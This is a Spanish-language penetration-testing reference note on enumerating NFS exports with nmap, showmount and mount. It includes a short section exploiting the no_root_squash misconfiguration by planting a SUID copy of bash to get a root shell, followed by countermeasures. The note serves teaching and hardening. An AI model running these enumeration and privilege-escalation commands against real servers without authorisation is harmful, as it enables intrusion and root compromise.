---
title: Enumeración NFS (Network File System)
slug: enumeracion-nfs
aliases: [Enumeración NFS (Network File System)]
fase: [Enumeración]
plataforma: Multi
dificultad: Básica
mitre: [T1135, T1548.001]
related: []
learning_refs: []
---

# Enumeración NFS (Network File System)

## Descripción
NFS (Network File System) es un protocolo de sistema de archivos distribuido que permite a los clientes montar particiones remotas como si fueran locales. Opera principalmente sobre el puerto 2049/tcp y UDP, usando RPC (puerto 111). La enumeración NFS permite descubrir que directorios exporta el servidor y, si los controles de acceso son debiles, montarlos localmente para leer o escribir archivos. La misconfiguracion critica es la opcion `no_root_squash`, que permite a un cliente conectarse como root y escribir archivos con privilegios de root en el servidor.

## Herramientas
- **nmap** (scripts NSE nfs-ls, nfs-showmount, nfs-statfs) — detección y listado de exports
- **showmount** — lista los exports disponibles de un servidor NFS
- **mount** — monta el filesystem remoto localmente

## Comandos / Ejemplos

```bash
# Detectar NFS con nmap
nmap -sV -p 111,2049 <target>
nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <target>

# Resultado esperado de nfs-showmount:
# | nfs-showmount:
# |   /home/ubuntu * (accesible desde cualquier IP)
# |   /var/nfs/general *

# Listar exports disponibles con showmount
showmount -e <target>

# Montar el export localmente
mkdir /mnt/nfs
mount -t nfs <target>:/<export> /mnt/nfs
mount -t nfs 10.10.10.10:/home/ubuntu /mnt/nfs

# Listar contenido
ls -la /mnt/nfs/

# Desmontar cuando se termine
umount /mnt/nfs

# Verificar opciones del export (no_root_squash es critico)
# En el servidor: cat /etc/exports
# Ejemplo peligroso: /home *(rw,sync,no_root_squash)
```

**Explotación de no_root_squash:**
```bash
# Si no_root_squash esta habilitado, se puede copiar /bin/bash con SUID
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# En el servidor como usuario limitado:
/tmp/bash -p    # shell con privilegios de root
```

## Contramedidas
- Nunca usar la opcion `no_root_squash` en exports NFS — usar `root_squash` (por defecto)
- Restringir exports a IPs o rangos de red especificos en `/etc/exports`
- Usar NFSv4 con Kerberos para autenticación fuerte
- Filtrar el acceso a los puertos 111 y 2049 por firewall a IPs autorizadas
- Revisar periodicamente `/etc/exports` para detectar configuraciones inseguras
- Monitorear montajes NFS en los logs del sistema (`/var/log/syslog`)

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1135: Network Share Discovery. https://attack.mitre.org/techniques/T1135/
